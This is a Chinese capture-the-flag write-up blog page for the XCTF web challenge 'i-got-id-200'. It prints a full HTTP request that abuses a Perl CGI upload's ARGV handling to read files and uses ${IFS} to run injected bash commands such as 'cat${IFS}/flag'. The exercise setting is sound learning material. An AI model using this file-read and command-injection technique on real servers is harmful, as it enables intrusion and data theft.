<!DOCTYPE html>
<html>
<head>
	

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>XCTF_WEB_i-got-id-200 | iN1t0</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="CTF_WP">
    <meta name="description" content="嗯。。我刚建好了一个网站这个是真不会,看各位大佬的解法.CSAW 2016I-Got-Id-Web200 gwyxjtu Burpsuite内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051POST &#x2F;cgi-bin&#x2F;file.pl?&amp;#">
<meta property="og:type" content="article">
<meta property="og:title" content="XCTF_WEB_i-got-id-200">
<meta property="og:url" content="https://in1t0.github.io/2019-07-18-XCTF_WEB_i-got-id-200.html">
<meta property="og:site_name" content="iN1t0">
<meta property="og:description" content="嗯。。我刚建好了一个网站这个是真不会,看各位大佬的解法.CSAW 2016I-Got-Id-Web200 gwyxjtu Burpsuite内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051POST &#x2F;cgi-bin&#x2F;file.pl?&amp;#">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2019-07-17T16:00:00.000Z">
<meta property="article:modified_time" content="2021-05-23T09:47:37.647Z">
<meta property="article:author" content="iN1t0">
<meta property="article:tag" content="CTF_WP">
<meta name="twitter:card" content="summary">
    
        <link rel="alternate" type="application/atom+xml" title="iN1t0" href="/atom.xml">
    
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>
    

<meta name="generator" content="Hexo 4.2.1"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand_bak.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">iN1t0</h5>
          <!--
          <a href="mailto:fuckhackers@gmail.com" title="fuckhackers@gmail.com" class="mail">fuckhackers@gmail.com</a>
          -->
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/cyberchef/index.html"  >
                <i class="icon icon-lg icon-flask"></i>
                Cyberchef
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/reverse-shell-generator/index.html"  >
                <i class="icon icon-lg icon-terminal"></i>
                ReverseShell
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/hacktricks/index.html"  >
                <i class="icon icon-lg icon-book"></i>
                Hacktricks
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/PeiQiWIKI/index.html"  >
                <i class="icon icon-lg icon-rocket"></i>
                PeiQiWIKI
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/ctf-wiki/index.html"  >
                <i class="icon icon-lg icon-flag"></i>
                CTFwiki
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/iN1t0" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">XCTF_WEB_i-got-id-200</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">XCTF_WEB_i-got-id-200</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-07-17T16:00:00.000Z" itemprop="datePublished" class="page-time">
  2019-07-18
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#嗯。。我刚建好了一个网站"><span class="post-toc-number">1.</span> <span class="post-toc-text">嗯。。我刚建好了一个网站</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#此处我的理解就是一个可以由系统自行决定的分隔参数-这里可以代替空格。"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">此处我的理解就是一个可以由系统自行决定的分隔参数,这里可以代替空格。</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#flag"><span class="post-toc-number">2.</span> <span class="post-toc-text">flag</span></a></li></ol>
        </nav>
    </aside>


<article id="post-2019-07-18-XCTF_WEB_i-got-id-200"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">XCTF_WEB_i-got-id-200</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-07-18 00:00:00" datetime="2019-07-17T16:00:00.000Z"  itemprop="datePublished">2019-07-18</time>

            


            

        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h4 id="嗯。。我刚建好了一个网站"><a href="#嗯。。我刚建好了一个网站" class="headerlink" title="嗯。。我刚建好了一个网站"></a>嗯。。我刚建好了一个网站</h4><p>这个是真不会,看各位大佬的解法.<br><br><a href="https://tsublogs.wordpress.com/2016/09/18/606/" target="_blank" rel="noopener">CSAW 2016I-Got-Id-Web200</a> <br><br><a href="https://github.com/gwyxjtu/my_CTF_diary/blob/a6f7260b54bd01682a2f1649b4eaabdb7d5dede6/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%A2%98%E7%9B%AE/README.md" target="_blank" rel="noopener">gwyxjtu</a><br></p>
<p>Burpsuite内容<br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;file.pl?&#x2F;bin&#x2F;bash%20-c%20find$&#123;IFS&#125;&#x2F;$&#123;IFS&#125;-name$&#123;IFS&#125;flag| HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">Host: 111.198.29.45:33243</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;62.0.3202.9 Safari&#x2F;537.36</span><br><span class="line"></span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http:&#x2F;&#x2F;111.198.29.45:33243&#x2F;cgi-bin&#x2F;file.pl</span><br><span class="line"></span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------71575106519528928091391711349</span><br><span class="line"></span><br><span class="line">Content-Length: 428</span><br><span class="line"></span><br><span class="line">Cookie: user&#x3D;4b9987ccafacb8d8fc08d22bbca797ba</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------71575106519528928091391711349</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ARGV</span><br><span class="line"></span><br><span class="line">-----------------------------71575106519528928091391711349</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;hello4&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asdasd</span><br><span class="line"></span><br><span class="line">-----------------------------71575106519528928091391711349</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Submit!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Submit!</span><br><span class="line"></span><br><span class="line">-----------------------------71575106519528928091391711349--</span><br></pre></td></tr></table></figure>
<blockquote>
<p>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。</p>
</blockquote>
<blockquote>
<p>“&lt;&gt;” doesn’t work with strings unless the string is “ARGV”, so it loops through the ARG values and inserting each one to an open() call =&gt; We can read content of any file by assign the scalar value first, so $file will be assigned our scalar value instead of the uploaded file descriptor</p>
</blockquote>
<p>至于<code>${IFS}</code></p>
<blockquote>
<p> Shell 脚本中有个变量叫 IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substitution.<br>     Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。<br>     而 IFS 是一种 set 变量，当 shell 处理”命令替换”和”参数替换”时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。</p>
</blockquote>
<h5 id="此处我的理解就是一个可以由系统自行决定的分隔参数-这里可以代替空格。"><a href="#此处我的理解就是一个可以由系统自行决定的分隔参数-这里可以代替空格。" class="headerlink" title="此处我的理解就是一个可以由系统自行决定的分隔参数,这里可以代替空格。"></a>此处我的理解就是一个可以由系统自行决定的分隔参数,这里可以代替空格。</h5><p><code>POST /cgi-bin/file.pl?/bin/bash%20-c%20cat${IFS}/flag| HTTP/1.1</code></p>
<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>cyberpeace{064af8ad1103f55bbb98177fdb08693c}</p>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2021-05-23T09:47:37.647Z" itemprop="dateUpdated">2021-05-23 17:47:37</time>
</span><br>


        
        <font color="#FF0000">干</font><font color="#EA0015">啥</font><font color="#D5002A">啥</font><font color="#C0003F">不</font><font color="#AB0054">行</font><font color="#960069">，</font><font color="#81007E">吃</font><font color="#6C0093">饭</font><font color="#5700A8">第</font><font color="#4200BD">一</font><font color="#2D00D2">名</font><font color="#1800E7">。</font></br><a href="/2019-07-18-XCTF_WEB_i-got-id-200.html" target="_blank" rel="external">https://in1t0.github.io/2019-07-18-XCTF_WEB_i-got-id-200.html</a>
        
    </div>
    
    <footer>
        <a href="https://iN1t0.github.io">
            <img src="/img/avatar.jpg" alt="iN1t0">
            iN1t0
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-WP/" rel="tag">CTF_WP</a></li></ul>


            


        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2019-07-18-XCTF_WEB_bug.html" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">XCTF_WEB_bug</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2019-07-20-XCTF_WEB_ics-07.html" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">XCTF_WEB_ics-07</h4>
      </a>
    </div>
  
</nav>



    




















</article>



</div>

        <footer class="footer">
    <div class="top">
        

        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>iN1t0 &copy; 2018 - 2021</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>


    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: false, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>








<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = 'Pornhub';
            clearTimeout(titleTime);
        } else {
            document.title = 'JadeTwan';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
